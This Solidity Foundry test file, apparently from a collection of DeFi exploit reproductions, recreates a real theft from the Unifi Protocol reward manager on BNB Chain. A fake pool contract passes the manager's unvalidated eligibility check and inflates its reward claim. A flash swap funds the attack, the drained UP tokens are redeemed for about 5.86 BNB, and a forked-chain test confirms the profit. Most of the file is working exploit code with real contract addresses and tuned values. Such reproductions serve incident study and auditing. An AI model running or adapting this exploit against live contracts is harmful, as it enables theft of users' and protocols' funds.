// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Unifi Protocol (UP) reward manager - fake-pool injection into an unvalidated LP reward path - BNB Chain.
// Attacker net gain ~5.859 BNB.
//
// Attack tx      : 0x74634e4ccc7e8922798c7043f839219b1a1a4d6087f57cdbf3bd1544198b02e8 (block 121045767)
// Attacker EOA   : 0xB78E77dEdDaf20f238e1D8f9d1De7606c23Cdd81
// Exploit (on-chain, contract-creation tx): 0xf6BA170f3d50a21fAD30f2D02972ffd295F04e8C
//                 -> deployed inner worker 0x44ED72d81a32A284f3fb50f9c6E6f2EF739bb324, which was BOTH the
//                    fake "pool" AND the exploit logic (pool == msg.sender for the manager calls). This PoC
//                    splits those two roles into two named contracts (UnifiFakePool + UnifiProtocolExploit)
//                    while preserving pool == caller, which the manager requires.
// Reward manager : 0x5D8aA15505aFEc01Bab0dE21F9377673B5246EAE  (UNVERIFIED on BscScan; interface below is
//                    reconstructed from the decoded attack trace - mintUP / claimUP selectors confirmed)
// UP token       : 0x36F20660b9947929Ab3edd8727B5Af60260333A7  (verified)
// UPRedeemer     : 0x1b8c6808b48C7A9b6997b6dAEF6401307B2B419A  (verified; redeem(uint256) is public/whenNotPaused)
// WBNB           : 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
// Flash pair     : 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16  (PancakeV2 WBNB/BUSD, 0.001 WBNB flash swap)
//
// Root cause (confirmed against the attack trace; manager is unverified so there is no source to read, but
// the trace is unambiguous): the reward manager trusts a caller-supplied "pool" address for BOTH LP eligibility
// AND the reward math, with no factory/registry/whitelist check and no privileged role. mintUP requires only
// that the caller passes itself as the pool (pool == msg.sender, "Unifi: Invalid params" otherwise):
//   mintUP(pool) payable  -> UPMintable(pool) calls pool.token0() and treats the pool as eligible when it
//                            equals WBNB (token0()==WBNB short-circuits; token1() is never reached in the trace).
//                            No check that `pool` is a real factory-deployed pair.
//   claimUP(pool, a, b)   -> reward size is driven by pool.balanceOf(pool) and pool.totalSupply(), again read
//                            straight off the caller-supplied address.
// So a contract that merely implements token0()/totalSupply()/balanceOf() with attacker-chosen values passes
// eligibility and drives the reward calculation. The fake balanceOf is tuned so the computed pending reward just
// reaches the manager's entire held UP balance (larger would overshoot and revert on the UP transfer).
//
// Attack flow, reconstructed below as ordinary typed calls (no bytecode blob, no raw calldata replay):
//   1. Flash-swap 0.001 WBNB out of the PancakeV2 WBNB/BUSD pair (pancakeCall callback).
//   2. Unwrap to native BNB and fund the fake pool, which calls mintUP{value}(itself) - eligible via token0()==WBNB.
//   3. The fake pool calls claimUP(itself,...) - its inflated balanceOf drains the manager's whole UP balance.
//   4. Redeem the stolen UP at the UPRedeemer for ~5.86 BNB of backing (UP is heavily over-collateralised).
//   5. Rewrap and repay the flash swap (+0.25% fee); keep the ~5.859 BNB surplus.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

// Reconstructed from the decoded trace (manager is unverified).
interface IUPRewardManager {
    function mintUP(address pool) external payable returns (uint256);
    function claimUP(address pool, address a, address b) external;
}

interface IUPRedeemer {
    function redeem(uint256 upAmount) external;
}

// The fake "pool": not a real pair, but it satisfies the four view functions the manager trusts, and it is the
// entity that calls the manager (the manager requires pool == msg.sender).
contract UnifiFakePool {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    IUPRewardManager constant MANAGER = IUPRewardManager(0x5D8aA15505aFEc01Bab0dE21F9377673B5246EAE);
    IERC20 constant UP = IERC20(0x36F20660b9947929Ab3edd8727B5Af60260333A7);

    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    // token0()==WBNB is what the manager's UPMintable() eligibility check short-circuits on.
    function token0() external pure returns (address) {
        return WBNB;
    }

    function token1() external pure returns (address) {
        return BUSD;
    }

    // Fixed supply the manager reads as the LP denominator.
    function totalSupply() external pure returns (uint256) {
        return 1e18;
    }

    // Attacker-chosen LP balance driving the reward numerator. Exact value used on-chain: tuned so the pending
    // reward just reaches the manager's whole UP balance without overshooting.
    function balanceOf(address) external pure returns (uint256) {
        return 6041339220182213708556;
    }

    // Drive the manager as the (fake) pool/LP: mint against itself, then claim the inflated reward. The stolen
    // UP is forwarded to the exploit contract for redemption.
    function mintAndClaim() external payable {
        require(msg.sender == owner, "only owner");
        MANAGER.mintUP{value: msg.value}(address(this));
        MANAGER.claimUP(address(this), address(this), address(this));
        UP.transfer(owner, UP.balanceOf(address(this)));
    }
}

contract UnifiProtocolExploit {
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant UP = IERC20(0x36F20660b9947929Ab3edd8727B5Af60260333A7);
    IUPRedeemer constant REDEEMER = IUPRedeemer(0x1b8c6808b48C7A9b6997b6dAEF6401307B2B419A);
    IPancakePair constant FLASH_PAIR = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);

    uint256 constant FLASH_WBNB = 1e15; // 0.001 WBNB, same as the attack

    UnifiFakePool public immutable fakePool;
    address public immutable owner;

    constructor() {
        fakePool = new UnifiFakePool();
        owner = msg.sender;
    }

    function attack() external {
        // Step 1: borrow 0.001 WBNB via a PancakeV2 flash swap -> pancakeCall callback.
        FLASH_PAIR.swap(FLASH_WBNB, 0, address(this), hex"00");
        // Forward the profit to the caller.
        payable(owner).transfer(address(this).balance);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(FLASH_PAIR), "not pair");

        // Step 2: unwrap and let the fake pool mint+claim (manager requires pool == caller, so the pool calls).
        WBNB.withdraw(amount0);
        fakePool.mintAndClaim{value: amount0}();

        // Step 3: redeem the stolen UP for its BNB backing.
        uint256 upBal = UP.balanceOf(address(this));
        UP.approve(address(REDEEMER), upBal);
        REDEEMER.redeem(upBal);

        // Step 4: repay the flash swap (0.25% fee) in WBNB.
        uint256 repay = (amount0 * 10000) / 9975 + 2;
        WBNB.deposit{value: repay}();
        WBNB.transfer(address(FLASH_PAIR), repay);
    }

    receive() external payable {}
}

contract UnifiProtocol_exp is Test {
    IERC20 constant UP = IERC20(0x36F20660b9947929Ab3edd8727B5Af60260333A7);
    address constant MANAGER = 0x5D8aA15505aFEc01Bab0dE21F9377673B5246EAE;

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        vm.createSelectFork("bsc", 121045766); // parent block of the exploit tx

        emit log_named_decimal_uint("manager UP balance before", UP.balanceOf(MANAGER), 18);

        UnifiProtocolExploit exploit = new UnifiProtocolExploit();
        uint256 balBefore = address(this).balance;

        exploit.attack();

        uint256 profit = address(this).balance - balBefore;
        emit log_named_decimal_uint("manager UP balance after ", UP.balanceOf(MANAGER), 18);
        emit log_named_decimal_uint("attacker BNB profit      ", profit, 18);

        // Matches the on-chain 5.859108237446175701 BNB forwarded to the attacker EOA.
        assertApproxEqRel(profit, 5.859108237446175701 ether, 0.01e18, "profit off expected ~5.86 BNB");
    }

    receive() external payable {}
}
